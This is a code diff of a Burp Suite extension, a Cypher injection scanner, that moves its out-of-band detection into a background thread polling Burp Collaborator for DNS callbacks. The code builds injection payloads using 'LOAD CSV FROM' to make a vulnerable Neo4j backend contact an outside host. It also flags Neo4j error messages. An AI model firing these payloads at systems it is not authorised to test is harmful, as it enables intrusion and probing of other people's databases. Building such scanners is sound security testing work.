@@ -1,41 +1,42 @@
 package burp;
 
+import java.io.PrintWriter;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
+import java.util.concurrent.locks.Lock;
+import java.util.concurrent.locks.ReentrantLock;
 
 public class BurpExtender implements IBurpExtender, IScannerCheck {
     private String extensionName = "Cypher Injection Scanner";
     private IBurpExtenderCallbacks callbacks;
     private IExtensionHelpers helpers;
-    private IBurpCollaboratorClientContext collaborator;
-    private String payloadCollaborator;
-
+    private PrintWriter stdout;
+    private Monitor monitor;
+    
     private static final byte[] NEO4J_ERROR = "Neo4jError: ".getBytes();
     
     @Override
     public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
         this.callbacks = callbacks;
-        // stdout = new PrintWriter(callbacks.getStdout(), true);
+        stdout = new PrintWriter(callbacks.getStdout(), true);
         
         helpers = callbacks.getHelpers();
         callbacks.setExtensionName(extensionName);
-        
-        collaborator = callbacks.createBurpCollaboratorClientContext();
-        payloadCollaborator = collaborator.generatePayload(true);
-
+        monitor = new Monitor(stdout, callbacks);
+        new Thread(monitor).start();
         // register ourselves as a custom scanner check
         callbacks.registerScannerCheck(this);
+        callbacks.registerExtensionStateListener(monitor);
     }
     
     /** 
      * helper method to search a response for occurrences of a literal match string
      * @return a list of start/end offsets */
-    private List<int[]> getMatches(byte[] response, byte[] match) {
+    public static List<int[]> getMatches(IExtensionHelpers helpers, byte[] response, byte[] match) {
         List<int[]> matches = new ArrayList<int[]>();
-
         int start = 0;
         while (start < response.length) {
             start = helpers.indexOf(response, match, true, start, response.length);
@@ -67,7 +68,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
      * @return a issue or null if not find NEO4J_ERROR in response
      */
     public IScanIssue searchDescriptiveError(IHttpRequestResponse baseRequestResponse, String payload, IScannerInsertionPoint insertionPoint) {
-        List<int[]> matches = getMatches(baseRequestResponse.getResponse(), NEO4J_ERROR);
+        List<int[]> matches = getMatches(helpers, baseRequestResponse.getResponse(), NEO4J_ERROR);
         int[] requestHighlights = null;
         String param = "";
         if (payload.length() > 0) {
@@ -85,20 +86,6 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
      */
     public IScanIssue searchDescriptiveError(IHttpRequestResponse baseRequestResponse) {
         return searchDescriptiveError(baseRequestResponse, "", null);
-    }
-
-    /** @return all the dns querys received by the burp collaborator client */
-    public List<String> getDNSQuerys() {
-        List<String> dnsQuerys = new ArrayList<String>();
-        List<IBurpCollaboratorInteraction> interactions = collaborator.fetchAllCollaboratorInteractions();
-        for (IBurpCollaboratorInteraction interaction : interactions) {
-            if (interaction.getProperty("query_type") != null) {
-                String base64Query = interaction.getProperty("raw_query");
-                String query = helpers.bytesToString(helpers.base64Decode(base64Query));
-                dnsQuerys.add(query);
-            }
-        }
-        return dnsQuerys;
     }
 
     /** @return a string random of length size
@@ -129,7 +116,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
         else if (off1.length() > 0) //handling when payload is concat with quotes
             if (off2.equals("})")) offFinal = " MATCH(:Z{w:" + off1 + "3";
             else offFinal = " MATCH(:Z) WHERE " + off1 + "3" + off1 + "=" + off1 + "3";
-        return off1 + off2 + "LOAD CSV FROM 'https://" + hash + "." + payloadCollaborator + "' as yl" + offFinal;
+        return off1 + off2 + "LOAD CSV FROM 'https://" + hash + "." + monitor.getUrl() + "' as yl" + offFinal;
     }
 
 
@@ -147,43 +134,13 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
         return payloads;
     }
 
-    public int[] getHighlights(IScannerInsertionPoint insertionPoint, String payload) {
+    public static int[] getHighlights(IScannerInsertionPoint insertionPoint, String payload) {
         int[] requestHighlight = insertionPoint.getPayloadOffsets(payload.getBytes());
         return requestHighlight;
     }
 
-    /** called by a thread to analyze if collaborator has received requests from payloads */
-    public synchronized void verifyCollaborator(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint, HashMap<String, String> payloads, HashMap<String, Object[]> requests) {
-        //wait for DNS querys
-        try {Thread.sleep(10000); } catch (Exception e) {}
-        
-        //gets burp collaborator interactions
-        List<String> dnsQuerys = getDNSQuerys();
-        boolean foundInjection = false;
-        if (dnsQuerys.size() > 0) {
-            for (String query : dnsQuerys) {
-                if (foundInjection) // to avoid repeat issue in the same point
-                    break;
-                for (String hash : payloads.keySet()) {
-                    List<int[]> queryMatches = getMatches(query.getBytes(), hash.getBytes());
-                    //if find the request that generated the received hash 
-                    if (queryMatches.size() > 0) { 
-                        IHttpRequestResponse mRequest = (IHttpRequestResponse) requests.get(hash)[0];
-                        String payload = (String) requests.get(hash)[1];
-                        int[] requestHighlight = getHighlights(insertionPoint, payload);
-                        IScanIssue issue = new CypherInjectionIssue(baseRequestResponse, mRequest, helpers, Arrays.asList(requestHighlight), callbacks, payload, insertionPoint.getInsertionPointName());
-                        foundInjection = true;
-                        callbacks.addScanIssue(issue);
-                        break;
-                    }
-                }
-            }
-        }
-    }
-    
     @Override
     public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
-        
         List<IScanIssue> issues = new ArrayList<>();
 
         //try error requests
@@ -210,8 +167,8 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
                 payload = baseValue + payload;
             byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());
             IHttpRequestResponse modifiedRequest = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
-            requests.put(hash, new Object[]{ modifiedRequest, payload });
-            
+            requests.put(hash, new Object[]{ modifiedRequest, payload, insertionPoint, baseRequestResponse });
+
             //verify if reponse has error
             IScanIssue issue = searchDescriptiveError(modifiedRequest, payload, insertionPoint);
             if (issue != null && issues.size() == 0) {
@@ -220,11 +177,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
         }
 
         //analyze if any payload worked
-        new Thread(new Runnable() {
-            public void run() {
-                verifyCollaborator(baseRequestResponse, insertionPoint, payloads, requests);
-            }
-        }).start();
+        monitor.add(payloads, requests);
 
         return (issues.size() > 0) ? issues : null;
     }
@@ -243,6 +196,115 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
             return -1;
         else 
             return 0;
+    }
+}
+
+class Monitor implements Runnable, IExtensionStateListener {
+    private boolean stop; 
+    private PrintWriter stdout;
+    private IBurpExtenderCallbacks callbacks;
+    private IExtensionHelpers helpers;
+    private HashMap<String, String> payloads;
+    private HashMap<String, Object[]> requests;
+    private List<String> dnsQuerys;
+    private IBurpCollaboratorClientContext collaborator;
+    private String urlCollaborator;
+    private Lock lock;
+
+    public Monitor(PrintWriter stdout, IBurpExtenderCallbacks callbacks) {
+        this.stdout = stdout;
+        this.callbacks = callbacks;
+        this.helpers = callbacks.getHelpers();
+        this.payloads = new HashMap<String, String>();
+        this.requests = new HashMap<String, Object[]>();
+        this.dnsQuerys = new ArrayList<>();
+        stop = false;        
+        collaborator = callbacks.createBurpCollaboratorClientContext();
+        urlCollaborator = collaborator.generatePayload(true);
+        lock = new ReentrantLock();
+    }
+
+    public String getUrl() {
+        return urlCollaborator;
+    }
+
+    public void extensionUnloaded() {
+        stdout.println("unloading");
+        stop = true;
+        Thread.currentThread().interrupt();
+    }
+
+    public void add(HashMap<String, String> payloads, HashMap<String, Object[]> requests) {
+        boolean notAdd = true;
+        while (notAdd) {
+            if(lock.tryLock()) {
+                try {
+                    this.payloads.putAll(payloads);
+                    this.requests.putAll(requests);
+                } finally {
+                    lock.unlock();
+                    notAdd = false;
+                }
+            }
+        }
+    }
+
+    public void run() {
+        try {
+            while (!stop) {
+                Thread.sleep(10000);
+                verify();
+            }
+        } catch (Exception e) {
+            stdout.println("Error fetching/handling interactions: "+e.getMessage());
+        }
+    }
+
+    /** @return all the dns querys received by the burp collaborator client */
+    public List<String> getDNSQuerys() {
+        List<String> dnsQuerys = new ArrayList<String>();
+        List<IBurpCollaboratorInteraction> interactions = collaborator.fetchAllCollaboratorInteractions();
+        for (IBurpCollaboratorInteraction interaction : interactions) {
+            if (interaction.getProperty("query_type") != null) {
+                String base64Query = interaction.getProperty("raw_query");
+                String query = helpers.bytesToString(helpers.base64Decode(base64Query));
+                dnsQuerys.add(query);
+            }
+        }
+        return dnsQuerys;
+    }
+
+    public void verify() {
+        //gets burp collaborator interactions
+        if (lock.tryLock()) {
+            try {
+                // stdout.println("getDNSQuerys");
+                dnsQuerys = getDNSQuerys();
+                boolean foundInjection = false;
+                for (String query : dnsQuerys) {
+                    if (foundInjection) // to avoid repeat issue in the same point
+                        break;
+                    for (String hash : payloads.keySet()) {
+                        List<int[]> queryMatches = BurpExtender.getMatches(helpers, query.getBytes(), hash.getBytes());
+                        //if find the request that generated the received hash 
+                        if (queryMatches.size() > 0) { 
+                            IHttpRequestResponse mRequest = (IHttpRequestResponse) requests.get(hash)[0];
+                            String payload = (String) requests.get(hash)[1];
+                            IScannerInsertionPoint insertionPoint = (IScannerInsertionPoint) requests.get(hash)[2];
+                            IHttpRequestResponse baseRequestResponse = (IHttpRequestResponse) requests.get(hash)[3];
+                            int[] requestHighlight = BurpExtender.getHighlights(insertionPoint, payload);
+                            IScanIssue issue = new CypherInjectionIssue(baseRequestResponse, mRequest, helpers, Arrays.asList(requestHighlight), callbacks, payload, insertionPoint.getInsertionPointName());
+                            foundInjection = true;
+                            callbacks.addScanIssue(issue);
+                            break;
+                        }
+                    }
+                }    
+            } finally {
+                lock.unlock();
+            }
+        }
+        
     }
 }
 
